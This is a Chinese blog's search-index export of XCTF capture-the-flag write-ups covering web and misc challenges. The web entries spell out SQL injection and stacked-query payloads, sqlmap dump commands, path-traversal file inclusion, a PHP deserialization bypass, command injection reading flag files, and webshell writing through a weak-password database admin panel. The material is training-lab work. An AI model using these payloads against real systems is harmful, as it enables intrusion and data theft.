再见李华（1）下载附件得到一张图片，图上是md5的信息，但解密不出来。放到kali中binwalk一下，发现还有一个压缩包。用foremost分离文件，得到压缩包，但解压需要密码。（2）根据题目提示，1000个字，署名，LiHua猜测1000个字是4位，LiHua是密码的一部分，将这两个部分组合起来，用ARCHPR进行爆破（3）爆破时攻击类型选择“掩码”，并设置掩码“????LiHua”（4）成功破解，得到密码15CCLiHua，解压后得到flag","categories":[{"name":"XCTF_Misc进阶区","slug":"XCTF-Misc进阶区","permalink":"http://example.com/categories/XCTF-Misc%E8%BF%9B%E9%98%B6%E5%8C%BA/"}],"tags":[{"name":"CTF靶场","slug":"CTF靶场","permalink":"http://example.com/tags/CTF%E9%9D%B6%E5%9C%BA/"}]},{"title":"Web_005","slug":"XCTF/Web-005","date":"2020-11-15T08:40:29.000Z","updated":"2020-11-15T08:41:37.518Z","comments":true,"path":"2020/11/15/XCTF/Web-005/","link":"","permalink":"http://example.com/2020/11/15/XCTF/Web-005/","excerpt":"","text":"NaNNaNNaNNaN-Batman（1）下载附件，是一个没有后缀名的文件，用notepad++打开（2）很多乱码，但从&lt;script&gt;中可以看出是这是一段js代码，需要用浏览器打开。将文件后缀名改为.html，点击打开。（3）有一个输入框，但是输什么都没有反应。查看网页源代码，发现源代码里有乱码。（4）出现乱码是因为 html 无法识别某些编码，在“eval”前添加一句“alert(_);”。重新用浏览器打开，即显示出正常代码。（5）使用在线网站将这段js代码对齐 https://beautifier.io/（6）可以看到需要满足几个 if 中的正则表达式条件，^表示开始，$表示结尾，同时还要满足长度为16位。把匹配出来的值be0f233ac7be98aa，输入到网页中的输入框就得到了flag。 web2（1）打开网址，根据注释中的提示，逆向加密算法，解密$miwen就能得到flag（2）分析其中的PHP内置函数 strrev(string): 反转字符串 strlen(string): 返回字符串的长度 substr(string, start, length): 返回字符串的一部分 //string: 所需要的字符串 //start: 在字符串何处开始 //length: 可选。规定被返回字符串的长度。默认是直到字符串的结尾 ord(string): 返回字符串首个字符的 ASCII 值 chr(): 从指定的 ASCII 值返回对应的字符 str_rot13(string): 对字符串执行 ROT13 编码。 //ROT13 编码把每一个字母在字母表中向前移动 13 个字母。数字和非字母字符保持不变 base64_encode(string): 使用 MIME base64 对数据进行编码 (3)分析网址中的函数 &lt;?php $miwen=&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;; function encode($str)&#123; //给encode一个参数 $str $_o=strrev($str); //将所传参数 $str 通过 strrev() 函数反转字符串操作并赋值给 $_o // echo $_o; for($_0=0;$_0&lt;strlen($_o);$_0++)&#123; //循环遍历 变量 $_o $_c=substr($_o,$_0,1); //在for循环中首先依次取字符串 $_o 的第 $_0 个值，赋值给 $_c $__=ord($_c)+1; //将变量 $c 转化为 ASCII码 并 +1，赋值给 $_ $_c=chr($__); //将 $__ 转化为该ASCII码所对应的字符，赋值给 $_c $_=$_.$_c; //拼接字符串，赋值给$_ &#125; return str_rot13(strrev(base64_encode($_))); //将拼接好后的字符串 $_ 先进行 base64编码，再将编码后的值进行反转字符串操作， //最后对反转后的字符串进行 rot13 加密，得出结果为$miwen &#125; highlight_file(__FILE__); /* 逆向加密算法，解密$miwen就是flag */ ?&gt; （4）用在线工具写出逆向代码 https://tool.lu/coderunner/ &lt;?php $str=&#39;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&#39;; $_ = base64_decode(strrev(str_rot13($str))); $_o=NULL; for($_0=0;$_0&lt;strlen($_);$_0++)&#123; $_c=substr($_,$_0,1); $__=ord($_c)-1; $_c=chr($__); $_o=$_o.$_c; &#125; echo strrev($_o); ?&gt;","categories":[{"name":"XCTF_Web进阶区","slug":"XCTF-Web进阶区","permalink":"http://example.com/categories/XCTF-Web%E8%BF%9B%E9%98%B6%E5%8C%BA/"}],"tags":[{"name":"CTF靶场","slug":"CTF靶场","permalink":"http://example.com/tags/CTF%E9%9D%B6%E5%9C%BA/"}]},{"title":"Web_004","slug":"XCTF/Web-004","date":"2020-11-15T08:37:05.000Z","updated":"2020-11-15T08:39:18.905Z","comments":true,"path":"2020/11/15/XCTF/Web-004/","link":"","permalink":"http://example.com/2020/11/15/XCTF/Web-004/","excerpt":"","text":"ics-06（1）打开网址，根据题意点击报表中心（试了一下点击其他的发现都一样）（2）发现URL栏有?id=1，使用burp爆破id。（3）设置浏览器的配置为手动代理配置，burp设置为拦截请求，刷新页面（4）发送给Inturder，设置爆破点为id变量（5）把爆破变量设为数值（6）为了让爆破更快，这里设置多一点线程（7）开始攻击，发现id为2333时长度和其他数值不一样（这里不要一个一个找，点击“长”，英文版是“length”会排序）（8）回到网址，把id改为2333，发现flag warmup（1）打开网址，是一张滑稽图片，查看网页源代码，发现source.php（2）进一步访问，又发现一个hint.php（3）这里提示了flag在这个ffffllllaaaagggg文件中（4）返回source.php，继续审计代码（5）参数file满足三个条件，就会包含文件，file可以由自己构造。条件一：检查file变量是否为空。条件二：检查file变量是否为字符串。条件三：通过checkFile函数来检查（6）由于要构造payload，条件一和二直接满足，直接查看checkFile函数代码：（7）发现包含四个if语句：第一个 if 语句对变量进行检验，要求$page为字符串，否则返回 false；第二个 if 语句判断$page是否存在于$whitelist数组中，存在则返回 true;第三个 if 语句，截取传进参数中首次出现?之前的部分，判断该部分是否存在于$whitelist数组中，存在则返回 true;第四个 if 语句，先对构造的 payload 进行 url 解码，再截取传进参数中首次出现?之前的部分，并判断该部分是否存在于$whitelist中，存在则返回 true; #以上4个if语句，满足一个即可返回true。都未满足则返回false。（8）这里用第三个if语句构造参数： ?file=source.php?/../../../../ffffllllaaaagggg 第一个?用来传参，第二个?用来满足截取（9）include#因为参数有定义路径，就会忽略/前的字符串，直接去找/../../../../ffffllllaaaagggg这个文件。 NewsCenter解法一：（1）打开网址，如上图所示页面。考虑到xss或sql注入，试试sql注入。随便输入123后，使用burp抓包 （2）发现是post方式，直接sqlmap爆破。将这些保存在一个文本文档里，为了方便命名为1.txt。并将该文本放到sqlmap所在目录下。使用命令爆破数据库 sqlmap.py -r 1.txt --dbs （3）看到一个news，继续使用命令查看news数据库的内容 sqlmap.py -r 1.txt -D news --dump （4）发现flag 解法二：（1）尝试构造语句sr’ or ‘1=1，果然返回了7条新闻。通常使用单引号，1,2等尝试，然后用union联合查询获取信息。union就是两个结果的去重合集，但前提要列数一致。因此构造语句判断数据的列数。 sr&#39; union select 1,2# （2）没有正确返回结果，再试试： sr&#39; union select 1,2,3# //语句中的第一个单引号&#39;用来闭合后台的第一个&#39;，前面的sr也可改成其他字符或数字 //语句中的#用来注释掉后台的第二个&#39; （3）只有1,2,3的时候才正确返回，因此数据的列数为3列。（4）接下来利用information_schema来获得所有的表名，构造语句： sr&#39; union select 1,2,table_name from information_schema.tables# //前面的1，2就是凑列数的 （5）得到一大串的表名，慢慢找，发现最底下有news和secret_table数据库（6）因为试过了news，没有结果。接下来利用information_schema.columns的结构来获得secret表的信息。我们要得到的信息也就只有列名column_name，也可以再加上column_type来查看数据类型。附上大佬的文章https://www.cnblogs.com/JiangLe/p/5793555.html因此，构造 sr&#39; union select 1,column_type,column_name from information_schema.columns where table_name=&#39;secret_table&#39;# （7）看到了flag的信息，构造语句： sr&#39; union select 1,2,fl4g from secret_table#","categories":[{"name":"XCTF_Web进阶区","slug":"XCTF-Web进阶区","permalink":"http://example.com/categories/XCTF-Web%E8%BF%9B%E9%98%B6%E5%8C%BA/"}],"tags":[{"name":"CTF靶场","slug":"CTF靶场","permalink":"http://example.com/tags/CTF%E9%9D%B6%E5%9C%BA/"}]},{"title":"Web_003","slug":"XCTF/Web-003","date":"2020-11-15T08:33:05.000Z","updated":"2020-11-15T08:34:45.036Z","comments":true,"path":"2020/11/15/XCTF/Web-003/","link":"","permalink":"http://example.com/2020/11/15/XCTF/Web-003/","excerpt":"","text":"supersqli这里使用谷歌浏览器拿到题目后，发现是单引号报错字符型注入用order by语句判断出两个字段：order by 2的时候页面正常回显，order by 3的时候页面出错。使用union select联合查询，发现关键字select被正则过滤了因此，需要绕过select的过滤解法一：（1）堆叠注入/?inject=-1’;show tables –+(2)发现了两张表，分别查询两张表中的字段，/?inject=-1’;show columns from 1919810931114514 –+/?inject=-1’;show columns from words –+(3)发现了flag在第一个表中，接下来就是要查看flag的内容了。但是select被过滤了，这里可以采用预编译的方式绕过。 ?inject=-1&#39;;set @sql = CONCAT(&#39;sele&#39;,&#39;ct * from \\`1919810931114514\\`;&#39;);prepare aaa from @sql;EXECUTE aaa;# （4）这里用strstr函数过滤了’set’和’prepare’关键词，利用strstr不能区分大小写，将其改为大写即可 /?inject=-1&#39;;sEt @sql = CONCAT(&#39;sele&#39;,&#39;ct * from \\`1919810931114514\\`;&#39;);prepArE aaa from @sql;EXECUTE aaa;# 或者 /?inject=-1&#39;;sEt @sql = CONCAT(&#39;se&#39;,&#39;lect * from \\`1919810931114514\\`;&#39;);prEpare stmt from @sql;EXECUTE stmt;# 或者 /?inject=-1&#39;;use supersqli;set @sql=concat(&#39;s&#39;,&#39;elect * from \\`1919810931114514\\`&#39;);PREPARE pre FROM @sql;EXECUTE pre;--+ 解法二：handler查询在查找到有两张表的前提下进行（1）使用方法：handler table_name open打开一张表handel table_name read first读取第一行内容，handel table_name read next依次获取其它行 /?inject=-1&#39;;handler `1919810931114514` open;handler `1919810931114514` read first;# 解法三：（1）修改表名和列名，在查找到两个表后，看一下第二个表（2）其中有一个列就是data列，是可以进行查询的。所以这里将表1919810931114514名字改为words，flag列名字改为id，就可以查询flag的内容了。 1&#39;; alter table words rename to aaaa;alter table `1919810931114514` rename to words;alter table words change flag id varchar(100);# 其中：alter table words rename to aaaa;先把原来的words表名字改成别的，这个随便alter table`1919810931114514` rename to words;将表1919810931114514的名字改为wordsalter table words change flag id varchar(100);将改完名字后的表中的flag改为id，字符串尽量长点（3）然后用1’ or 1=1 –+直接就能得到正确结果","categories":[{"name":"XCTF_Web进阶区","slug":"XCTF-Web进阶区","permalink":"http://example.com/categories/XCTF-Web%E8%BF%9B%E9%98%B6%E5%8C%BA/"}],"tags":[{"name":"CTF靶场","slug":"CTF靶场","permalink":"http://example.com/tags/CTF%E9%9D%B6%E5%9C%BA/"}]},{"title":"Web_002","slug":"XCTF/Web-002","date":"2020-11-15T08:27:58.000Z","updated":"2020-11-15T08:31:43.086Z","comments":true,"path":"2020/11/15/XCTF/Web-002/","link":"","permalink":"http://example.com/2020/11/15/XCTF/Web-002/","excerpt":"","text":"Web_php_include(考察文件包含)strstr函数：strstr(字符串,你要搜索的内容,false)#字符串：也就是代码中的$page。例如：在url后面添加 /?page=123456，那么$page的内容就是123456。 #你要搜索的内容：也就是题目中的php://。意思就是该函数会从$page的内容里去寻找php://，而这里是一个while语句，一旦查找到php://，那么就会执行大括号里面的语句。 #false：该参数默认是false，也就是一般情况只需要写前两个参数即可。false代表匹配到php://之后，会输出php://和之后的内容。而如果为true，则会输出“php.”，也就是php://前面的内容。 例如URL为http://111.198.29.45:50769/?page=php.php://input那么传入的$page的内容就是php://input，而前面的“php.”就会被丢弃。 #注：strstr函数对大小写敏感，也就是会区分大小写。 str_replace()以其他字符替换字符串中的一些字符(区分大小写)：例如：str_replace(“1”，“2”，“123”)会输出223。因为会将全部的1替换为2。 打开页面是这样一段代码，从代码中得知page中带有php://的都会被替换成空,程序过滤掉了page=参数传入php://strstr() 查找字符串首次出现的位置。返回字符串剩余部分 解法一（大小写绕过）：（1）由于strstr()这个函数是区分大小写的，所以可以用PHP://来代替。即http://220.249.52.133:45015/?page=PHP://input（2）首先使用手动代理配置，打开burp工具，配置拦截请求，刷新网页后，进行burp抓包（3）post传参，在burp中点击废包查看（4）发送到Repeater，在重发器中点击发送，可看到fl4gisisish3r3.php （5）继续post传参，即可看到flag解法二：（1）while函数根据page参数来判断php文件是否存在，如果存在此文件，则进行文件包含。代码中的hello是有回显的，可以命令执行然后回显到浏览器（2）构造payload，默认页面为http://127.0.0.1/index.php,设置为page值，可确保while为真，让page参数用http伪协议访问127.0.0.1这个条件肯定为真。（3）看到了三个文件，继续构造payload，查看fl4gisisish3r3.php，发现flag解法三：（1）用御剑扫描后台，会扫到phpmyadmin后台（2）双击它进入登录界面，用户名输入为root，密码为空。（弱口令）进入（3）进入SQL语句输入的地方，执行命令show variables like “secure_file_priv”查看secure_file_priv是否为空，为空则可以写数据，如果是null则不能写。（4）进入SQL语句输入的地方，编辑一句话木马并执行select” “ into outfile ‘/tmp/songrong.php’其中shell为口令，可任意修改，songrong也可修改。Linux默认tmp是可写目录，所以在tmp目录下写入（5）然后打开菜刀类工具中国蚁剑，输入URL和密码连接（6）连接成功后，打开文件管理，可发现flag","categories":[{"name":"XCTF_Web进阶区","slug":"XCTF-Web进阶区","permalink":"http://example.com/categories/XCTF-Web%E8%BF%9B%E9%98%B6%E5%8C%BA/"}],"tags":[{"name":"CTF靶场","slug":"CTF靶场","permalink":"http://example.com/tags/CTF%E9%9D%B6%E5%9C%BA/"}]},{"title":"Web_001","slug":"XCTF/Web-001","date":"2020-11-15T08:19:06.000Z","updated":"2020-11-15T08:21:36.418Z","comments":true,"path":"2020/11/15/XCTF/Web-001/","link":"","permalink":"http://example.com/2020/11/15/XCTF/Web-001/","excerpt":"","text":"baby_web（1）按照提示，初始界面想到index.php，再次请求index.php后仍是1.php(被重定向了)。F12打开开发者模式查看“网络”模块，查看返回包发现确实有index.php，并且其中的location参数被设置为了1.php，同时发现flag(2)也可以访问index.php，用Burp抓包，在响应包中发现flag Training-WWW-Robots（1）根据题目，熟悉robots.txt，在URL后加上/robots.txt（2）发现一个fl0g.php文件，在URL后加上fl0g.php访问，得到flag Web_php_unserialize（1）先是一段代码审计 &lt;?php class Demo &#123; private $file = &#39;index.php&#39;; public function __construct($file) &#123; $this-&gt;file = $file; //构造函数，对类的变量进行初始化 &#125; function __destruct() &#123; echo @highlight_file($this-&gt;file, true); &#125; //魔术方法，如果有反序列化的使用，在反序列化之前会先调用这个方法 function __wakeup() &#123; if ($this-&gt;file != &#39;index.php&#39;) &#123; //the secret is in the fl4g.php $this-&gt;file = &#39;index.php&#39;; &#125; &#125; &#125; if (isset($_GET[&#39;var&#39;])) &#123; $var = base64_decode($_GET[&#39;var&#39;]); //正则匹配，如果在var变量中存在O/C:数字(O:数字或者C:数字这样的形式&#125;)，不区分大小写，就输出stop hacking!否则的话就进行发序列化 if (preg_match(&#39;/[oc]:\\d+:/i&#39;, $var)) &#123; die(&#39;stop hacking!&#39;); &#125; else &#123; @unserialize($var); &#125; &#125; else &#123; highlight_file(&quot;index.php&quot;); &#125; ?&gt; （2）审计完成之后，思路就很清晰了，对Demo这个类进行序列化，base64加密之后，赋值给var变量进行get传参就行了在类Demo中有三个方法，一个构造，一个析构，还有就是一个魔术方法，构造函数__construct()在程序执行开始的时候对变量进行赋初值。析构函数__destruct()，在对象所在函数执行完成之后，会自动调用，这里就会高亮显示出文件。在反序列化执行之前，会先执行__wakeup这个魔术方法，所以需要绕过，当成员属性数目大于实际数目时可绕过wakeup方法，正则匹配可以用+号来进行绕过。 &lt;?php class Demo &#123; private $file = &#39;index.php&#39;; //protected $file1 = &#39;index.php&#39;; public function __construct($file) &#123; $this-&gt;file = $file; //$this-&gt;file1 = $file1; &#125; function __destruct() &#123; echo @highlight_file($this-&gt;file, true); &#125; function __wakeup() &#123; if ($this-&gt;file != &#39;index.php&#39;) &#123; //the secret is in the fl4g.php $this-&gt;file = &#39;index.php&#39;; &#125; &#125; &#125; $a = new Demo(&quot;fl4g.php&quot;); echo serialize($a).&quot;\\n&quot;; //O:4:&quot;Demo&quot;:1:&#123;s:10:&quot; Demo file&quot;;s:8:&quot;fl4g.php&quot;;&#125; echo base64_encode(&#39;O:+4:&quot;Demo&quot;:2:&#123;s:10:&quot; Demo file&quot;;s:8:&quot;fl4g.php&quot;;&#125;&#39;); 使用代码在线工具执行,https://tool.lu/coderunner/修改之后，再进行base64加密，传参就可以了index.php?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ== php_rce （1）进入后发现是一个php框架，根据题目php-rce远程命令执行，在github上查一下这个版本有什么漏洞（2）发现有好几个版本，由于只知道是5.0，则随便输入一个试试，这里注意只从”?s”开始复制，”?s”之前的是靶场。（3）得到进一步提示，为5.0.2版本，回到github找到5.0.2版本的再次复制，然后访问。发现可以进行远程命令执行。（4）ls查看有没有什么提示信息，可用hackbar执行，或者直接在地址栏输入命令也可。这里注意要把原来最后一个”=”后面的东西删掉再输入命令。（5）ls后没有发现有用信息，接着查找上一级目录，直到发现flag（6）然后输入查看命令 cat /flag即可看到flag（7）也可以无需一级一级目录的找，使用命令find / -name flag,也可找到flag，然后cat /flag 就可以看到flag了。","categories":[{"name":"XCTF_Web进阶区","slug":"XCTF-Web进阶区","permalink":"http://example.com/categories/XCTF-Web%E8%BF%9B%E9%98%B6%E5%8C%BA/"}],"tags":[{"name":"CTF靶场","slug":"CTF靶场","permalink":"http://example.com/tags/CTF%E9%9D%B6%E5%9C%BA/"}]},{"title":"Web","slug":"XCTF/Web","date":"2020-11-15T08:04:01.000Z","updated":"2020-11-15T08:06:46.567Z","comments":true,"path":"2020/11/15/XCTF/Web/","link":"","permalink":"http://example.com/2020/11/15/XCTF/Web/","excerpt":"","text":"view_source这里右键无法查看网页源代码，可通过f12键或者在url地址前加上”view-source:”查看网页源代码找到flag。 get_postHTTP常用的请求方法：get，post。（1）直接把请求参数拼接在URL后面，以？间隔URL和参数，若有多个参数，则以&amp;间隔参数 http://220.249.52.133:55274/？a=1 （2）post：提交post请求用插件hackbar。首先置入URL，选择POST Data，输入post请求，然后执行。 robots（1）在URL后加上/robots.txt并访问，发现f1ag_1s_h3re.php（2）访问http://111.198.29.45:33982/f1ag_1s_h3re.php得到flag（3）也可使用扫目录脚本dirsearch(https://github.com/maurosoria/dirsearch) python dirsearch.py -u http://10.10.10.175:32793/ -e * #使用dirsear需要在Python3环境下 #robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。 backup（1）常见的备份文件后缀名有：”.gif”、”.svn”、”.swp”、”~”、”.bak”、”.bash_history”、”.bkf”（共7种）根据提示index.php文件进行备份，逐个尝试构造备份链接。找到.bak的备份文件（2）下载备份文件直接打开就能够找到flag。（3）也可以使用目录扫描工具dirsearch扫出index.php.bak文件，然后构造链接即可。 cookie解法一：（1）在Firefox浏览器按下F12键打开开发者工具，刷新后，在“存储”一栏，可看到名为look-here的cookie的值为cookie.php（2）构造链接访问http://220.249.52.133:38910/cookie.php，提示查看http响应包，在“网络”一栏，可看到访问cookie.php的数据包，在消息头内可发现flag解法二：（1）使用burpsuite工具扫描URL，然后查看response（响应），可看到名为look-here的cookie的值为cookie.php（2）继续扫描构造的链接http://220.249.52.133:38910/cookie.php，查看response获取flag disabled_button（1）使用Firefox浏览器按F12键打开开发者工具，在查看器窗口审查元素，发现存在disabled=””字段，在按钮中使用了该属性，右键编辑HTML，将该字段删除。按钮可按，即可得到flag。（2）使用Firefox的hackbar，用post方式传递auth=flag，同样可以得到flag。 weak_auth（1）题目属于弱口令爆破，随便输入一个用户名和密码，提示要用admin用户登录，跳转到了check.php，在URL前加view-source:查看源代码，提示要用字典。（2）在Firefox浏览器中“选项”–&gt;”网络设置”–&gt;“手动代理配置”开启foxproxy代理服务器，打开Burpsuite工具，点击代理—拦截请求，输入123密码再登录。（3）设置爆破点：将123作为攻击对象，具体操作：测试器–&gt;位置–&gt;选中“123”–&gt;添加（5）加载字典：点击有效载荷–载入–常用密码.txt。字典:&lt;https://github.com/rootphantomer/Blasting_dictionary/blob/master/%E5%B8%B8%E7%94%A8%E5%AF%86%E7%A0%81.txt&gt;（6）开始攻击，查看响应包列表，发现密码为123456时，响应包的长度和别的不一样（7）点进去查看响应包，发现flag simple_php（1）打开页面，进行代码审计，发现需要输入a，b变量，同时满足a==0 且a为真，b不是数字且b&gt;1234才回返回flag，用get方法输入变量，在URL后加“/?”即可开始赋值，传输多个参数则以”&amp;”间隔。（2）输入a=0无法得到flag1，因为不满足第二个a为真的条件，所以可以把参数a构造为’0’或abc这种转换后为0，但本身也为真的形式，即str类型。（3）数字和字符混合的字符串转换为整数后只保留数字，所以b可以构造为12345a，类型转换后为12345，大于1234，得到flag。 xff_referer（1）打开网页后，发现IP是123.123.123.123，使用Firefox浏览器，手动配置代理服务器（2）打开Brup工具抓包，点击代理（Proxy）—拦截请求，刷新原来页面（3）右键选择发送到repeater。在repeater里查看目标地址内容，在Host下方添加：X-Forwarded-For：123.123.123.123（这一步是伪造XFF，点击放包（Forward），收到提示）原来的页面变成了https://www.google.com（4）在Repeater（重发器），Host下方添加：X-Forwarded-For:123.123.123.123Referer:https://www.google.com (这一步是伪造Referer）点击发送，在响应中看到flag#XFF漏洞攻击原理及防御方案：https://www.freebuf.com/company-information/220414.html xff和referer:#X-Forwarded-For：简称xff头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP代理或者负载均衡服务器时才会添加该项。xff是http的拓展头部，作用是Web服务器获取访问用户的IP真实地址（可伪造）。由于很多用户通过代理服务器进行访问，服务器只能获取代理服务器的IP地址，而xff作用在于记录用户的真实IP，以及代理服务器的IP。格式为：X-Forwarded-For：本机IP，代理1IP，代理2IP。 #HTTP Referer是header的一部分，当浏览器向Web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基于此可以获得一些有用的信息用于处理。Referer是http的拓展头部，作用是记录当前请求页面的来源页面的地址。服务器使用Referer确认访问来源，如果Referer内容不符合要求，服务器可以拦截或者重定向请求。 webshell（1）一句话木马，直接提示给了php一句话，使用菜刀类工具连接（Cknife或中国蚁剑），口令就是shell（2）这里使用中国蚁剑。右键–&gt;Add,输入URL和口令，选择类型，点击”Add“即可（3）右键–&gt;“FileManager”文件管理，即可发现flag.txt文件，打开获取flag command_execution（1）尝试输入127.0.0.1，发现可以访问成功（2）输入127.0.0.1 | ls（用&amp;&amp;也可以），看是否能够访问当前目录（3）访问成功，再试试寻找 .txt文件（或者直接寻找flag.txt文件也可），输入 127.0.0.1 | find / -name &quot;*.txt&quot; //寻找.txt文件 127.0.0.1 | find / -name &quot;flag.txt&quot; //寻找flag.txt文件 （4）访问成功后都可发现flag.txt文件，用127.0.0.1 | cat /home/flag.txt 即可查看到flag#命令拼接：管道符“|”，其功能为将前一个命令的结果传递给后一个命令作为输入&amp;&amp;：前一条命令执行成功时，才执行后一条命令 command1 | command2 //只输出2的结果 command1 &amp;&amp; command2 // 成功才执行2 simple_js（1）打开页面需要输入密码，查看网页源代码，可以发现js代码（2）进行代码审计，发现不论输入什么都会跳到假密码，真密码位于 fromCharCode（3）发现该字符串中用到C语言的转义字符\\x，每个\\x后面的两位是一个16进制数，直接用C语言printf输出即可得到对应的ASCII码值。（4）将得到的数字转为ASCII码值即可得到flag","categories":[{"name":"XCTF_Web练习区","slug":"XCTF-Web练习区","permalink":"http://example.com/categories/XCTF-Web%E7%BB%83%E4%B9%A0%E5%8C%BA/"}],"tags":[{"name":"CTF靶场","slug":"CTF靶场","permalink":"http://example.com/tags/CTF%E9%9D%B6%E5%9C%BA/"}]},{"title":"Misc_002","slug":"XCTF/Misc-002","date":"2020-11-15T07:59:58.000Z","updated":"2020-11-15T08:07:37.199Z","comments":true,"path":"2020/11/15/XCTF/Misc-002/","link":"","permalink":"http://example.com/2020/11/15/XCTF/Misc-002/","excerpt":"","text":"János-the-Ripper（1）附件是一个压缩包，解压后得到一个没有后缀名的文件，用notepad++打开（2）是一个压缩包，改后缀名为zip，解压，但需要密码（3）直接暴力破解，得到密码fish（4）得到flag Test-flag-please-ignore（1）下载附件，是一个压缩包，解压后用notepad++打开（2）一串十六进制数，转为字符串 hit-the-core（1）下载附件，得到一个core文件，放到kali下，使用命令strings查看字符串。（2）发现一串特殊的字符，格式像flag，看到前面的大写字母为ALXCTF，相邻的字母之间都隔了4个字符，按照这个规律，写个简单的程序（C语言），提取出flag。 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;strings.h&gt; int main()&#123; char a[200]; gets(a); int i=3; while(a[i] != 0)&#123; printf(&quot;%c&quot;,a[i]); i+=5; &#125; system(&quot;pause&quot;); return 0; &#125; （3） 快乐游戏题（1）得到一个附件，是一个捉猫猫游戏。鼓捣了好久，没有发现任何flag信息，最后看了大家的writeup，都是玩通关得出来的。没法，玩呗，玩了好久，终于困住猫了，拿到了flag。 Banmabanma（1）下载附件，一张斑马的图片，看了看，典型的条形码，直接在线扫码https://online-barcode-reader.inliteresearch.com/（2）得到flag。 easycap（1）下载附件，用wireshark打开，选择一个包，追踪tcp流，发现flag。注意格式，直接提交 FLAG:385b87afc8671dee07550290d16a8071 即可。 stage1（1）下载附件，得到一张图片，用stegsolve工具打开，图片太大直接用键盘上的左右键切换视图，在左一视图发现一个二维码。（2）用二维码扫描器扫描，得到一串十六进制数。（3）保存到一个文本文档，命名为1.txt，用010 editor导入十六进制，数字的开头为03 F3 ,可知是pyc文件，保存为1.pyc（4）用在线工具反编译，https://tool.lu/pyc/（5）复制后再Python.exe下执行，由于反编译后得到的是Python2的代码，这里我用的是Python3，要做点修改，最后一行改为print (flag)（6）前面的“…”是在循环中，按两下回车退出循环，然后再加一个flag(),调用函数，得到flag。","categories":[{"name":"XCTF_Misc进阶区","slug":"XCTF-Misc进阶区","permalink":"http://example.com/categories/XCTF-Misc%E8%BF%9B%E9%98%B6%E5%8C%BA/"}],"tags":[{"name":"CTF靶场","slug":"CTF靶场","permalink":"http://example.com/tags/CTF%E9%9D%B6%E5%9C%BA/"}]},{"title":"Misc_001","slug":"XCTF/Misc-001","date":"2020-11-15T07:47:50.000Z","updated":"2020-11-15T08:07:18.149Z","comments":true,"path":"2020/11/15/XCTF/Misc-001/","link":"","permalink":"http://example.com/2020/11/15/XCTF/Misc-001/","excerpt":"","text":"base64÷4（1）根据题目提示，直接用base16解密得到flag reverseMe（1）打开附件，发现是一张图片（2）用画图工具打开该图片，使用水平翻转，即可查看到flag something_in_image解法一：（1）使用记事本或010 editor工具打开附件，Ctrl+F搜索flag解法二：根据题目包含image，使用kali，命令：strings badimages | grep Flag （注，根据记事本中常出现的“Flag”，而不是“flag”进行搜索） wireshark-1（1）用wireshark打开附件，输入表达式http contains flag查找flag信息，根据题目，看到登录应该查找HTTP post请求，追踪筛选出的报文追踪tcp流，即可看到flag pure_color（1）附件是一张全白的png图片（2）用notepad++打开没有发现flag信息（3）用stegsolve打开，打开 File Format Analysis 没有flag的线索（4)最后在最底下的’&lt;’按钮发现了flag Aesop_secret（1）下载附件得到一张gif的动图，通过stegsolve工具分解得到9张图片（2）用画图工具分别将这九张图通过旋转、裁剪一系列操作，得到9张裁剪过的图，再将这9张裁剪过的图片拼在一起（这里耗费了较多时间），得到如下图（3）图片显示为ISCC，显然不是flag，再用notepad++打开原来的gif动图，发现一串密文（4）用base64解码，无果，根据题目和上面图片的ISCC，联想到AES加密，ISCC则为密钥（5）解码后仍然是一串密文，再次解密，得到flag a_good_idea（1）打开附件，是一张.jpg格式的图片，用notepad++打开（2）确实以FF D8开头，寻找图片结尾FF D9，发现后面还有一个压缩文件（3）将原图片后缀名改为.zip，解压后得到一个文件夹，里面是两张相同的图片和一个hint提示文本（4）hint为“试着找出像素的秘密”，用stegsolve工具合成这两张图片，发现一些红点，貌似是二维码（5）用wps图片编辑，在“工具”中选择“色彩”，将亮度和饱和度调到最高（6）发现还是不太明显，先保存这张图片，再用wps图片工具打开，再调一遍亮度和饱和度（7）可以看到清晰的二维码图片，用二维码扫描工具扫描图片，发现flag Training-Stegano-1一张bmp格式的图片，直接用notepad++打开，即可看flag，注意提交时不用加flag{} can_has_stdio?（1）用notepad++打开附件（2）发现是Brainfuck文件，用在线解析工具得到flaghttp://ctf.ssleye.com/brain.html#Brainfuck解析规则： “&gt;”: 指针位置右移一位 “&lt;”: 指针位置左移一位 +: 指针所指向的位置里面的值加1 -: 指针所指向的位置里面的值减1 . :输出指针当前位置指向单元格中的内容 [: 如果指针指向的单元值为零，向后跳转到对应的]指令的次一指令处 ]:如果指针指向的单元值不为零，向前跳转到对应的[指令的次一指令处(额…好像比较难理解,只是用于循环某一段代码而已,两个一般联合使用)","categories":[{"name":"XCTF_Misc进阶区","slug":"XCTF-Misc进阶区","permalink":"http://example.com/categories/XCTF-Misc%E8%BF%9B%E9%98%B6%E5%8C%BA/"}],"tags":[{"name":"CTF靶场","slug":"CTF靶场","permalink":"http://example.com/tags/CTF%E9%9D%B6%E5%9C%BA/"}]},{"title":"Misc","slug":"XCTF/Misc","date":"2020-11-15T03:43:19.000Z","updated":"2020-11-15T08:07:58.143Z","comments":true,"path":"2020/11/15/XCTF/Misc/","link":"","permalink":"http://example.com/2020/11/15/XCTF/Misc/","excerpt":"","text":"ext3(1)附件是一个没有后缀的文件，使用notepad++打开，Ctrl+F出现搜索框，搜索flag（2）发现在O7avZhikgKgbF目录下有个flag文件，用7-ZIP工具打开附件，找到flag.txt文件。（3）出现了一串base64加密的字符串，这里我用的是CaptfEncoder工具，解码后得flag{sajbcmbzskjjcnbhsbvcjbjszcszbkzj} 功夫再高也怕菜刀（1）附件是一个.pcapng文件，使用Wireshark打开文件查看报文查找flag信息，输入表达式http contains flag查看http协议的报文是否包含flag 